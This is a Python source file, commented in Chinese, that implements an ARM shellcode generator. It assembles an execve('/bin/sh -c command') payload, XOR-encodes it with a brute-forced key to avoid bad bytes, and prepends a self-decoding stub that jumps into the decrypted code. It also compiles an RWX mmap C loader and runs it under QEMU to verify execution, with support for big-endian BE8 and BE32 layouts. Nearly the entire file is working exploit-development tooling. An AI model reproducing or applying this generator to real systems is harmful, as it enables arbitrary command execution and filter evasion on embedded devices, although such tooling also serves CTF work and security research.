import logging
import os
import random
import subprocess
from config import CONFIG
from print_as_py_and_c import *



class ARMShellcodeGenerator:
    """
    一个为 ARM 架构生成 XOR 编码 shellcode 的多功能类。

    它会自动处理坏字节，并生成一个同样不含坏字节的解码器存根（decoder stub），
    最终将解码器和加密后的 payload 拼接在一起。
    【重构说明】: 解码器已根据要求切换回 AArch32 (标准ARM) 模式。
    """
    EXECVE_TEMPLATE_ARM = """
        .section .text
        .global _start
        .arm

        _start:
            @ execve("/bin/sh", ["/bin/sh", "-c", command], NULL)
            adr r0, shell_strings   @ r0 -> "/bin/sh"

            @ 【关键修复】正确地在栈上构建 argv 数组
            @ 1. 计算其他字符串的地址
            add r1, r0, #8          @ r1 -> "-c"
            add r2, r0, #11         @ r2 -> command 字符串
            eor r3, r3, r3          @ r3 = 0 (NULL)

            @ 2. 在栈上为4个指针分配16字节空间
            sub sp, sp, #16

            @ 3. 按正确顺序存储指针
            str r0, [sp, #0]        @ argv[0] = &("/bin/sh")
            str r1, [sp, #4]        @ argv[1] = &("-c")
            str r2, [sp, #8]        @ argv[2] = &("{command}")
            str r3, [sp, #12]       @ argv[3] = NULL

            @ 4. 设置 execve 的参数
            mov r0, r0              @ r0 仍然是 &("/bin/sh")
            mov r1, sp              @ r1 = argv (现在 sp 正确地指向数组开头)
            mov r2, r3              @ r2 = envp (NULL)

            mov r7, #11             @ execve 的系统调用号
            svc #0                  @ 发起系统调用

        failed_exec:
            @ 如果 execve 失败, 则调用 exit(1) 干净地退出
            mov r0, #1              @ 设置退出码为 1
            mov r7, #1              @ exit 的系统调用号
            svc #0                  @ 发起系统调用

        shell_strings:
            .string "/bin/sh"
            .asciz "-c"
            .asciz "{command}"
        """
    # 【最终方案】回归V1，使用LDRB/STRB并修复跳转逻辑
    DECODER_TEMPLATE_ARM = """
    .section .text
    .global _start
    .arm

    _start:
        @ --- 步骤 1: 获取 payload 的地址 (使用 r4) ---
        adr r4, payload_start

        @ --- 步骤 2: 加载密钥(r5)和循环次数(r6) ---
        {key_loader}
        {count_loader}

    decode_loop:
        @ --- 步骤 3: 解码循环 (使用 r7, r8 作为临时寄存器) ---
        @ 加载最高位字节 (无 00)
        ldrb r7, [r4, #3]
        lsl r7, r7, #24

        @ 加载次高位字节 (无 00)
        ldrb r8, [r4, #2]
        orr r7, r7, r8, lsl #16

        @ 加载次低位字节 (无 00)
        ldrb r8, [r4, #1]
        orr r7, r7, r8, lsl #8

        @ 核心优化: 规避 ldrb r8, [r4] (机器码 E5D48000)
        @ 使用 ldrb r8, [r4, #4] 并配合 sub r4, r4, #4 是一种常见且有效的技巧
        add r4, r4, #4                @ 指针 r4 临时前移 4 字节
        ldrb r8, [r4, #-4]            @ 加载最低位字节 (机器码 E4D48004, 无 00)
        sub r4, r4, #4                @ 将指针 r4 恢复到原位
        orr r7, r7, r8                @ 合并最终的字到 r7

        eor r7, r7, r5                @ 与密钥进行 XOR 操作

        @ 存储回内存
        strb r7, [r4], #1             @ 存储最低位字节, r4++
        mov r8, r7, lsr #8
        strb r8, [r4], #1             @ 存储次低位字节, r4++
        mov r8, r7, lsr #16
        strb r8, [r4], #1             @ 存储次高位字节, r4++
        mov r8, r7, lsr #24
        strb r8, [r4], #1             @ 存储最高位字节, r4++

        subs r6, r6, #1               @ 循环计数器减 1
        bne decode_loop               @ 如果计数器不为零，则继续循环

        @ --- 步骤 4: 跳转到已解码的 shellcode (使用 r4, r8) ---
        {loop_count_loader_for_jump}
        lsl r8, r8, #2
        sub r4, r4, r8
        bx r4

    payload_start:
        @ 加密后的 shellcode 将被放置在这里
        """

    def __init__(self, bad_bytes, save_files=False, endian="little", be8=True):
        """
        初始化编码器并自动执行整个编码流程。
        """
        # 步骤 1: 初始化所有属性
        self.raw_shellcode = None
        self.xor_encoded_shellcode = None
        self.xor_decoder_shellcode = None

        self.bad_bytes = bad_bytes
        self.save_files = save_files
        # 端序只影响填充 NOP 的字节序, 以及验证用 C 加载器的编译 ABI (-mbe32)
        self.endian = endian
        # 大端两种 ABI: BE8(默认, ARMv6+ 现代 ABI, 指令流小端/数据大端)
        #               BE32(加 -be32, 指令与数据都大端, ARMv5 及老固件)
        self.be8 = be8
        self.attempt = None
        self.key = None
        self.loop_count = 0

    def _to_be8(self, raw, obj_file):
        """
        【大端 BE8 支持】把 as 产出的 BE32 机器码转成 BE8 布局:
        指令字按小端字节序存放, 数据区(字符串等)保持大端。

        代码/数据的分界来自 as 生成的 $a/$d 映射符号(mapping symbol),
        ld --be8 做同样的事时用的也是这套标记; 只有 $d 之前(以及 $d 与 $a 之间)的
        部分才做 4 字节指令字的字节反转。没有映射符号时整段都按代码处理。
        """
        if not (self.endian == "big" and self.be8):
            return raw

        readelf = f"{CONFIG['ARM_TOOLCHAIN_PATH']}readelf"
        marks = []
        try:
            out = subprocess.run([readelf, "-sW", obj_file], check=True, capture_output=True, text=True).stdout
            for line in out.splitlines():
                parts = line.split()
                # 形如:  7: 00000044     0 NOTYPE  LOCAL  DEFAULT    1 $d
                # 注意不能用 nm: nm 默认会把 $a/$d/$t 这些映射符号过滤掉
                if len(parts) >= 8 and parts[-1] in ("$a", "$t", "$d"):
                    marks.append((int(parts[1], 16), parts[-1]))
        except (subprocess.CalledProcessError, FileNotFoundError, ValueError) as e:
            print(f"[!] 无法读取映射符号, BE8 转换跳过: {e}")
            return raw

        # 计算“属于代码”的区间
        ranges, start, in_code = [], 0, True
        for offset, kind in sorted(marks):
            if kind == "$d" and in_code:
                ranges.append((start, offset))
                in_code = False
            elif kind in ("$a", "$t") and not in_code:
                start, in_code = offset, True
        if in_code:
            ranges.append((start, len(raw)))

        buf = bytearray(raw)
        for begin, end in ranges:
            end = min(end, len(raw))
            for i in range(begin, end - 3, 4):
                buf[i:i + 4] = buf[i:i + 4][::-1]
        return bytes(buf)

    def _generate_shellcode_from_asm(self, command):
        """
        [重构] 使用 ARM 汇编模板和交叉编译器来生成执行特定命令的原始 shellcode。
        """
        final_asm = self.EXECVE_TEMPLATE_ARM.format(command=command)
        asm_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.s")
        obj_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.o")
        bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_raw_shellcode.bin")

        with open(asm_file, "w") as f:
            f.write(final_asm)

        try:
            cmd_as = [f"{CONFIG['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", obj_file, asm_file]
            subprocess.run(cmd_as, check=True, capture_output=True)

            cmd_objcopy = [f"{CONFIG['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", obj_file,
                           bin_file]
            subprocess.run(cmd_objcopy, check=True, capture_output=True)

            with open(bin_file, "rb") as f:
                self.raw_shellcode = self._to_be8(f.read(), obj_file)
            # 保存过程文件时, .bin 写回转好的 BE8 字节, 与终端打印保持一致
            if self.endian == "big" and self.be8:
                with open(bin_file, "wb") as f:
                    f.write(self.raw_shellcode)
        finally:
            if not self.save_files:
                for f in [asm_file, obj_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print_process_file_path(None, asm_file, obj_file, None, bin_file)

    def xorencoder(self):
        """
        [逻辑还原] 暴力搜索一个能生成不含坏字节 payload 的密钥。
        此函数现在只检查编码后的shellcode。
        """
        print(f"[+] 对原始 shellcode 进行 xor 编码，处理坏字节:")

        # 计算填充和循环次数
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_len = len(self.raw_shellcode) + padding_needed
        self.loop_count = padded_len // 4

        max_attempts = 200000
        for attempt in range(max_attempts):
            if (attempt + 1) % 50000 == 0:
                print(f"    -- 仍在搜索... (已尝试 {attempt + 1}/{max_attempts} 次)")

            key = random.randint(1, 0xFFFFFFFF)

            # --- 只检查编码后的 payload ---
            encoded_payload = self._internal_xorencode(key, self.raw_shellcode)
            if any(b in self.bad_bytes for b in encoded_payload):
                continue

            # --- 成功: payload 不含坏字节 ---
            self.attempt = attempt + 1
            self.key = key
            self.xor_encoded_shellcode = encoded_payload
            return
        raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到能生成干净 payload 的密钥。")

    def xordecoder(self):
        """
        [逻辑还原] 使用找到的密钥和循环次数生成解码器存根。
        此函数不检查生成的解码器是否包含坏字节，依赖于优化的汇编模板。
        """
        key_loader_asm = self._get_safe_value_loader('r5', self.key)
        count_loader_asm = self._get_safe_value_loader('r6', self.loop_count)
        # 为跳转逻辑加载循环次数到 r8
        loop_count_loader_for_jump_asm = self._get_safe_value_loader('r8', self.loop_count)

        decoder_asm_final = self.DECODER_TEMPLATE_ARM.format(
            key_loader=key_loader_asm,
            count_loader=count_loader_asm,
            loop_count_loader_for_jump=loop_count_loader_for_jump_asm
        )

        self.xor_decoder_shellcode = self._compile(decoder_asm_final)

    def verify_shellcode(self, shellcode):

        # [修正] 验证最终生成的 shellcode，而不是原始的 shellcode
        c_shellcode = ", ".join([f"0x{b:02x}" for b in shellcode])

        # C 语言加载器模板
        c_loader_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {{ {c_shellcode} }};

int main(void) {{
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, shellcode, sizeof(shellcode));
    fflush(stdout);
    ((void (*)(void))mem)();
    return 0;
}}
"""
        # 定义临时文件路径
        c_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_verify_shellcode.c")
        elf_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_verify_shellcode")

        try:
            # 写入 C 文件
            with open(c_file_path, "w") as f:
                f.write(c_loader_code)
            print(f"[+] 生成C测试文件: '{c_file_path}'")

            # 编译 C 文件
            # 【大端修复】armeb 工具链默认链接出 BE8 镜像(指令字节序反转, 数据保持大端),
            # 而 as 直接汇编出来的 shellcode 是 BE32(指令与数据都是大端)。
            # 若两者不一致, 取指时字节序错乱 → SIGSEGV。因此加载器的 ABI 必须跟着走:
            #   -e big(默认 BE8) → 默认链接(BE8), 配合已翻转的 BE8 shellcode
            #   -e big -be32     → -mbe32, 配合 BE32 shellcode
            abi_flags = ["-mbe32"] if (self.endian == "big" and not self.be8) else []
            subprocess.run([
                f"{CONFIG['ARM_TOOLCHAIN_PATH']}gcc",
                *abi_flags,
                "-o", elf_file_path,
                c_file_path,
                "-static"  # 静态链接对于 QEMU user-mode 很重要
            ], check=True, capture_output=True)
            print(f"[+] 测试程序编译完成: '{elf_file_path}'")
            # 使用 QEMU 执行
            result = subprocess.run([CONFIG['ARM_PATH'], elf_file_path], capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print("--- stderr ---")
                print(result.stderr)

            if result.returncode == 0:
                print("✅ 验证成功: Shellcode 似乎已成功执行 (QEMU 返回值为 0)。")
            else:
                print(f"[!] 验证警告: Shellcode 执行后 QEMU 返回非零值 ({result.returncode})。可能表示执行中出现问题。")

        except subprocess.CalledProcessError as e:
            print(f"\n[!!!] 验证失败: 编译 C 加载器时出错。")
            print(f"--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")

    def _internal_xorencode(self, key, data_to_encode):
        """
        内部辅助函数：使用给定的密钥对数据进行 XOR 编码。
        """
        # 使用一个不含坏字节的 ARM NOP 指令 (mov r1, r1 -> e1a01001) 作为填充
        # 指令 e1a01001 在大端 BE32 下的内存字节序是 e1 a0 10 01,
        # 小端以及大端 BE8(指令流小端) 下是 01 10 a0 e1
        if self.endian == "big" and not self.be8:
            arm_nop = b'\xe1\xa0\x10\x01'
        else:
            arm_nop = b'\x01\x10\xa0\xe1'
        padding_needed = (4 - len(data_to_encode) % 4) % 4

        padded_data = data_to_encode + (arm_nop * (padding_needed // 4))

        encoded_buffer = bytearray()
        for i in range(0, len(padded_data), 4):
            chunk = padded_data[i:i + 4]
            dword = int.from_bytes(chunk, 'little')
            xored_dword = (dword ^ key).to_bytes(4, 'little')
            encoded_buffer.extend(xored_dword)
        return bytes(encoded_buffer)

    # def _get_safe_value_loader(self, register, value):
    #     if value < 256:
    #         # 使用 mov 指令，避免 ldr，因为 ldr 可能会从 .pool 加载数据，引入坏字节
    #         return f"mov {register}, #{value}\n"
    #     if value < 0x10000:
    #         return f"movw {register}, #{value}\n"
    #
    #     lower16 = value & 0xFFFF
    #     upper16 = (value >> 16) & 0xFFFF
    #     instr = f"movw {register}, #{lower16}\n"
    #     if upper16 != 0:
    #         instr += f"movt {register}, #{upper16}\n"
    #     return instr
    def _get_safe_value_loader(self, register, value):
        """
        生成一段汇编代码，用于将一个 32 位值安全地加载到指定的寄存器。
        该方法避免了 ldr/movt/movw 指令，并生成与字节序无关的代码。
        """
        instr = ""
        if value == 0:
            return f"eor {register}, {register}, {register}\n"

        # 使用 mov 和 orr 来构造值
        first_byte = value & 0xFF
        instr += f"mov {register}, #{first_byte}\n"

        if (value >> 8) & 0xFF != 0:
            second_byte = (value >> 8) & 0xFF
            instr += f"orr {register}, {register}, #{second_byte << 8}\n"

        if (value >> 16) & 0xFF != 0:
            third_byte = (value >> 16) & 0xFF
            instr += f"orr {register}, {register}, #{third_byte << 16}\n"

        if (value >> 24) & 0xFF != 0:
            fourth_byte = (value >> 24) & 0xFF
            instr += f"orr {register}, {register}, #{fourth_byte << 24}\n"

        return instr

    def _compile(self, asm_code):
        """
        [重构] 只编译汇编代码，不进行坏字节检查。
        """
        asm_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_xor_decoder.s")
        obj_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_xor_decoder.o")
        bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "arm_xor_decoder.bin")
        with open(asm_file, "w") as f:
            f.write(asm_code)
        try:
            # [重构] 移除 -mthumb 参数，使用默认的 ARM 模式
            cmd = [f"{CONFIG['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", obj_file, asm_file]
            subprocess.run(cmd, check=True, capture_output=True)

            subprocess.run(
                [f"{CONFIG['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", obj_file, bin_file],
                check=True, capture_output=True)
            # result = subprocess.run([f"{CONFIG['ARM_TOOLCHAIN_PATH']}objdump", "-d", obj_file], capture_output=True, text=True, check=True)
            # print(result.stdout.strip())
            with open(bin_file, "rb") as f:
                binary_code = self._to_be8(f.read(), obj_file)
            if self.endian == "big" and self.be8:
                with open(bin_file, "wb") as f:
                    f.write(binary_code)
            return binary_code
        except subprocess.CalledProcessError as e:
            print(
                f"\n[!!!] 汇编失败! 来自 'as' 的错误信息:\n--- (stderr) ---\n{e.stderr.decode('utf-8', errors='ignore')}--------------------")
            return b''
        finally:
            if not self.save_files:
                for f in [asm_file, obj_file, bin_file]:
                    if os.path.exists(f): os.remove(f)
            else:
                print_process_file_path(None, asm_file, obj_file, None, bin_file)